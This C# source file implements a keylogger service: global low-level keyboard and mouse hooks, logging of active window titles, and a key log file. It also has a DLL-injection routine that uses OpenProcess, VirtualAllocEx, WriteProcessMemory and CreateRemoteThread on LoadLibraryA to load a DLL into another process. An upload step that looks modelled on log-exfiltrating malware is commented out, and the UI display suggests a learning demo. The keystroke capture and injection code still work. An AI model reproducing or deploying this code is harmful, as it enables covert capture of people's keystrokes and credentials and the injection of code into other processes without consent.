﻿using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using FastWin32.Diagnostics;
using KeyBoardHook.Common.Native;
using KeyBoardHook.ExternalWindow;
using KeyBoardHook.KeyLogger.Entity;
using KeyBoardHook.KeyLogger.Enums;
using KeyBoardHook.KeyLogger.Hooker;
using Keys = System.Windows.Forms.Keys;
using System.Runtime.InteropServices;


namespace KeyBoardHook.KeyLogger.Service
{
    public class KeyLoggerService
    {
        private const int MaxLogSize = 153600; //150 KiB

        private ActiveWindowHook _activeWindowHook;
        private KeyboardHook _keyboardHook;
        private MouseHookService mouseHookService ;

        private KeyLog _keyLog;
        private readonly FileInfo _logFile;

        private TextBox TextBox;
        private TextBox TextBox2;
        private ComboBox comboBox;

        public KeyLoggerService(TextBox TextBox,TextBox TextBox2,ComboBox comboBox)
        {
            this.TextBox = TextBox;
            this.TextBox2 = TextBox2;
            this.comboBox = comboBox;

            _logFile = new FileInfo("./_logFile.txt");
            
            _keyLog = KeyLog.Create(_logFile.FullName);
            _keyLog.Saved += _keyLog_Saved;
            
            _keyboardHook = new KeyboardHook(this.comboBox);
            _keyboardHook.keyEventHandler += _keyEventHandler;
            
            
            _activeWindowHook = new ActiveWindowHook();
            _activeWindowHook.ActiveWindowChanged += _activeWindowHook_ActiveWindowChanged;

            mouseHookService = new MouseHookService();
            mouseHookService.MouseMoveEvent += mh_MouseMoveEvent;
        }

        private void _keyEventHandler(object sender, KeyEventArgs e)
        {
            TextBox.Text += Chr(e.KeyValue);
        }

        public static string Chr(int asciiCode)
        {
            if (asciiCode >= 0 && asciiCode <= 255)
            {
                System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding();
                byte[] byteArray = new byte[] { (byte)asciiCode };
                string strCharacter = asciiEncoding.GetString(byteArray);
                return (strCharacter);
            }
            else
            {
                throw new Exception("ASCII Code is not valid.");
            }
        }

        public void Stop()
        {
            _keyLog.Save();
            _activeWindowHook.UnHook();
            _keyboardHook.UnHook();
            mouseHookService.UnHook();
        }

        // SetWindowsHookEx有两种钩子函数，一种是全局钩子(global hook)，另一种是线程钩子(thread hook)。
        // 全局钩子能够截取所有线程的消息，但是全局钩子函数必须存在于一个dll中。线程钩子只能截取属于当前进程中的线程的消息，钩子函数不需要放 在dll中。
        // SetWinEventHook也有两种钩子函数，一种是进程内钩子(in-context hook)，另一种是进程外钩子(out-of-context hook)。
        // 进程内钩子函数必须放在dll中，将被映射到所有进程中。进程外钩子函数不会被映射到别的进程中，所以也不需要被放到dll中。不管进程内或 进程外钩子都能截取到所有进程的消息，区别仅是进程内钩子效率更高。
        // SetWindowsHookEx 和SetWinEventHook两种方法截取的消息的类型不一样。SetWindowsHookEx能截取所有WM_开头的消息。而 SetWinEventHook截取的消息都是EVENT_开头的，这些消息所有都是跟对象的状态相关的，所以它无法获取根鼠标键盘相关的消息。
        // SetWindowsHookEx设定的全局钩子必须被注入到别的进程中，所以就无法截取到一些有限制的进程的消息，比如命令行窗口(console window)。而SetWinEventHook的进程外钩子就没有这个限制
        public void Start(string type,string className ,string title)
        {

            IntPtr threadId = IntPtr.Zero;

            IntPtr moduleHandle;
            IntPtr hMod;
            switch (type)
            {
                case "当前进程钩子":
                    threadId = NativeMethods.GetCurrentThreadId();
                    hMod = NativeMethods.LoadLibrary("user32.dll");
                    _keyboardHook.Hook(HookType.WH_KEYBOARD,hMod, threadId);
                    mouseHookService.Hook(HookType.WH_MOUSE,hMod, threadId);
                    _activeWindowHook.Hook(threadId);
                    break;
                case "全局钩子":
                    threadId = IntPtr.Zero;
                    hMod = NativeMethods.LoadLibrary("user32.dll");
                    // moduleHandle = NativeMethods.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
                    _keyboardHook.Hook(HookType.WH_KEYBOARD_LL,hMod, threadId);
                    mouseHookService.Hook(HookType.WH_MOUSE_LL,hMod, threadId);
                    _activeWindowHook.Hook(threadId);
                    break;
                case "指定窗口进程钩子":

                    // injectionCCharpDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
                    injectionCDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
                    break;
              
            }

          
        }

        public void injectionCCharpDLL(string className, string title)
        {
            // 调用注入 .net DLL方法
            string sDllPath;
            sDllPath = "C:\\Users\\voidm\\Desktop\\Release\\MyLib.dll";
            var hWnd = NativeMethods.FindWindow(className,title);
            IntPtr threadId;
            var windowThreadProcessId = NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
            int num;
            string args = "args";
            MessageBox.Show(Injector.InjectManaged((uint) threadId, sDllPath, "MyLib.MyLibClass", "demo", args, out num)
                .ToString());

        }

        public void injectionCDLL(string className, string title)
        {
            string sDllPath;
            sDllPath = "C:\\Users\\voidm\\Desktop\\workspace\\hook\\DllMain.dll";

            var hWnd = NativeMethods.FindWindow(className,title);
            IntPtr threadId;
            var windowThreadProcessId = NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);

            MessageBox.Show($@"injectionCDLL hWnd {hWnd},windowThreadProcessId {windowThreadProcessId},threadId {threadId}");
            {
                // 用来获取目标进程句柄
                IntPtr hndProc = NativeMethods.OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), true, threadId);
                if (hndProc == IntPtr.Zero)
                {
                    MessageBox.Show("OpenProcess 异常");
                    return;
                }
                    
                // GetModuleHandle()和GetProcAddress()用来获取LoadLibrary()函数地址，进而用来调用LoadLibrary()
                // (Unicod为LoadLibraryW，ANSI为LoadLibraryA)
                IntPtr lpLLAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (lpLLAddress == IntPtr.Zero)
                {
                    MessageBox.Show("GetProcAddress 异常");
                    return;
                }
                    
                // 用来将DLL路径写入目标进程内存
                IntPtr lpAddress = NativeMethods.VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)sDllPath.Length, (0x1000 | 0x2000), 0X40);

                if (lpAddress == IntPtr.Zero)
                {
                    MessageBox.Show("VirtualAllocEx 异常");
                    return;
                }
                byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);

                // 用来将DLL路径写入分配的缓冲区
                var writeProcessMemory = NativeMethods.WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0);
                if (writeProcessMemory == 0)
                {
                    MessageBox.Show("WriteProcessMemory 异常");
                    return;                    
                }

                var remoteThread = NativeMethods.CreateRemoteThread(hndProc, (IntPtr)null, (IntPtr)0, lpLLAddress, lpAddress, 0, (IntPtr)null); 
                if (remoteThread==(IntPtr)0)
                {
                    MessageBox.Show("CreateRemoteThread 异常");
                    return;       
                }
                // NativeMethods.CloseHandle(remoteThread);
                NativeMethods.CloseHandle(hndProc);
            }
            
        }
        public bool TryPushKeyLog()
        {
            if (_logFile.Exists && _logFile.Length > 0)
            {
                _keyLog.Save();
                PushKeyLog(true);
                return true;
            }

            return false;
        }
     
        private void mh_MouseMoveEvent(object sender, MouseEventArgs e)
        {
            TextBox2.Text=("[btn:"+ e.Button + ":" + e.Clicks  +"   |" + e.X+ ":" + e.Y + "]");
            // Console.WriteLine("Move：[" + e.X+ ":" + e.Y + "]");
        }

        private void _keyLog_Saved(object sender, EventArgs e)
        {
            CheckSize();
        }

        private void _activeWindowHook_ActiveWindowChanged(object sender, ActiveWindowChangedEventArgs e)
        {
            TextBox.Text+=("\r\n======== 窗口 : [" + e.Title + "]========\r\n");
            _keyLog.WindowChanged(e.Title);
        }
 


        private void CheckSize()
        {
            _logFile.Refresh();
            if (!_logFile.Exists)
                return;

            if (_logFile.Length > MaxLogSize)
                PushKeyLog(false);
        }

        private void PushKeyLog(bool forcePush)
        {
            var tempLog = KeyLog.Parse(_logFile.FullName);
            try
            {
                // FIXME
                // _databaseConnection.PushFile(serializer.Serialize(tempLog.LogEntries), forcePush ? "Requested Key Log" : "Automatic Key Log", DataMode.KeyLog);
                _logFile.Delete();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static SpecialKeyType KeysToSpecialKey(Keys key)
        {
            switch (key)
            {
                case Keys.Enter:
                    return SpecialKeyType.Return;
                case Keys.Shift:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return SpecialKeyType.Shift;
                case Keys.LWin:
                case Keys.RWin:
                    return SpecialKeyType.Win;
                case Keys.Tab:
                    return SpecialKeyType.Tab;
                case Keys.Capital:
                    return SpecialKeyType.Captial;
                case Keys.Back:
                    return SpecialKeyType.Back;
                default:
                    return 0;
            }
        }

        
    }
}